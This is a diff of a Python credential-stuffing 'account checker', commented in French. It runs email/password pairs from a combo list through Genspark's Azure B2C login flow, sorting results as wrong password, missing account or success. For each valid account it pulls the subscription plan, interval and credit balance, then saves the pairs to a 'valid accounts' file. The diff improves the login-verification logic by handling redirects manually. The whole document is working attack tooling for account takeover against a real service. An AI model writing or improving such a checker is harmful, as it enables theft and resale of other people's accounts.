@@ -30,31 +30,31 @@ checked_count  = 0
 valid_count    = 0
 total_accounts = 0
 
-# --- URLs ---
+# --- URLs APIs Genspark ---
 USER_URL    = "https://www.genspark.ai/api/user"
 BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"
 
 
 def get_plan_and_balance(session):
     """
-    Appelle les deux APIs Genspark après une connexion réussie.
-    La session contient déjà le cookie session_id posé par /api/auth.
+    Appelle les deux APIs Genspark après connexion réussie.
+    La session contient déjà le cookie session_id valide.
     """
     info = {'plan': 'N/A', 'interval': 'N/A', 'balance': 'N/A'}
 
-    # 1. GET /api/user  →  plan + interval
+    # 1. GET /api/user → plan + interval
     try:
         r = session.get(USER_URL, timeout=10)
         if r.status_code == 200:
             data = r.json()
-            info['plan']     = data.get("personal_plan")                          or \
-                               data.get("data", {}).get("personal_plan")          or "N/A"
-            info['interval'] = data.get("personal_paid_sub_interval")             or \
+            info['plan']     = data.get("personal_plan") or \
+                               data.get("data", {}).get("personal_plan") or "N/A"
+            info['interval'] = data.get("personal_paid_sub_interval") or \
                                data.get("data", {}).get("personal_paid_sub_interval") or "N/A"
     except Exception:
         pass
 
-    # 2. GET /api/payment/get_credit_balance  →  balance
+    # 2. GET /api/payment/get_credit_balance → balance
     try:
         r = session.get(BALANCE_URL, timeout=10)
         if r.status_code == 200:
@@ -72,10 +72,15 @@ def get_plan_and_balance(session):
 def check_account(email, password):
     """
     Connexion complète en 3 étapes :
-      1. GET  authorize  → récupère csrf + transId
-      2. POST SelfAsserted  → vérifie email/mot de passe
-      3. GET  confirmed  → redirige vers https://www.genspark.ai/api/auth
-                           qui pose le cookie session_id sur genspark.ai
+
+    Étape 1 : GET  /authorize          → récupère csrf + transId
+    Étape 2 : POST /SelfAsserted        → soumet email + password
+    Étape 3 : GET  /confirmed           → redirige vers genspark.ai/api/auth
+              - Si la redirection contient 'error='  → compte invalide
+              - Si la redirection contient 'code='   → succès
+                → on suit UNE seule redirection vers /api/auth?code=...
+                → /api/auth pose le cookie session_id valide
+                → on s'arrête là et on utilise la session pour les APIs
 
     Retourne ('SUCCESS', session) ou ('CODE_ERREUR', None).
     """
@@ -89,7 +94,7 @@ def check_account(email, password):
     })
 
     try:
-        # ── Étape 1 : authorize ────────────────────────────────────────────
+        # ── Étape 1 : authorize ───────────────────────────────────────────
         start_url = (
             "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
             "b2c_1_new_login/oauth2/v2.0/authorize"
@@ -113,7 +118,7 @@ def check_account(email, password):
         csrf_token     = settings_data['csrf']
         transaction_id = settings_data['transId']
 
-        # ── Étape 2 : SelfAsserted POST ────────────────────────────────────
+        # ── Étape 2 : SelfAsserted POST ───────────────────────────────────
         login_post_url = (
             "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
             "B2C_1_new_login/SelfAsserted"
@@ -140,6 +145,7 @@ def check_account(email, password):
 
         r2_data = r2.json()
 
+        # Détection d'erreur via le body JSON de SelfAsserted
         if r2_data.get("status") == "400":
             message = r2_data.get("message", "")
             if "Your password is incorrect" in message:
@@ -151,23 +157,41 @@ def check_account(email, password):
         if r2_data.get("status") != "200":
             return 'ERROR_API', None
 
-        # ── Étape 3 : confirmed → redirige vers /api/auth → pose session_id ─
+        # ── Étape 3 : confirmed → 1 redirect → /api/auth?code=... ─────────
         confirm_url = (
             "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
             "B2C_1_new_login/api/CombinedSigninAndSignup/confirmed"
             f"?rememberMe=false&csrf_token={csrf_token}"
             f"&tx={transaction_id}&p=B2C_1_new_login"
         )
-        # allow_redirects=True : suit la chaîne de redirections jusqu'à genspark.ai
-        # qui pose le cookie session_id dans la session
-        r3 = session.get(confirm_url, timeout=15, allow_redirects=True)
 
-        # Vérification que le cookie session_id est bien présent sur genspark.ai
-        if not session.cookies.get('session_id', domain='www.genspark.ai') \
-           and 'session_id' not in session.cookies:
+        # NE PAS suivre les redirections automatiquement :
+        # on veut lire l'URL de destination du hop 1
+        hop1 = session.get(confirm_url, timeout=15, allow_redirects=False)
+        hop1_location = hop1.headers.get('location', '')
+
+        # Si l'URL de redirection contient 'error=' → login échoué côté Azure
+        if 'error=' in hop1_location:
+            if 'AADB2C90053' in hop1_location:
+                return 'ACCOUNT_NOT_FOUND', None
+            if 'incorrect' in hop1_location.lower():
+                return 'WRONG_PASSWORD', None
+            return 'INVALID', None
+
+        # Si l'URL contient 'code=' → succès : on suit UNE seule redirection
+        if 'code=' not in hop1_location:
+            return 'ERROR_NO_CODE', None
+
+        # Hop 2 : GET /api/auth?code=...
+        # → pose le cookie session_id valide sur www.genspark.ai
+        # → renvoie un 307 vers / (on l'ignore, on ne suit PAS)
+        hop2 = session.get(hop1_location, timeout=15, allow_redirects=False)
+
+        # Vérifier que session_id est bien présent dans les cookies
+        if 'session_id' not in session.cookies:
             return 'ERROR_NO_SESSION', None
 
-        # Mettre à jour le User-Agent et le Referer pour les appels API suivants
+        # Mettre à jour les headers pour les appels API suivants
         session.headers.update({
             'Referer': 'https://www.genspark.ai/',
             'Origin' : 'https://www.genspark.ai',
@@ -210,7 +234,7 @@ def worker():
                 interval = info['interval']
                 balance  = info['balance']
 
-                # Ligne sauvegardée dans le fichier valide
+                # Ligne sauvegardée dans comptes_valides.txt
                 save_line = (
                     f"{line} | "
                     f"Plan: {plan} | "
@@ -238,7 +262,7 @@ def worker():
             else:
                 if result_code == 'WRONG_PASSWORD':
                     error_msg = "Mot de passe incorrect"
-                elif result_code == 'ACCOUNT_NOT_FOUND':
+                elif result_code in ('ACCOUNT_NOT_FOUND', 'INVALID'):
                     error_msg = "Compte introuvable"
                 else:
                     error_msg = f"Erreur ({result_code})"
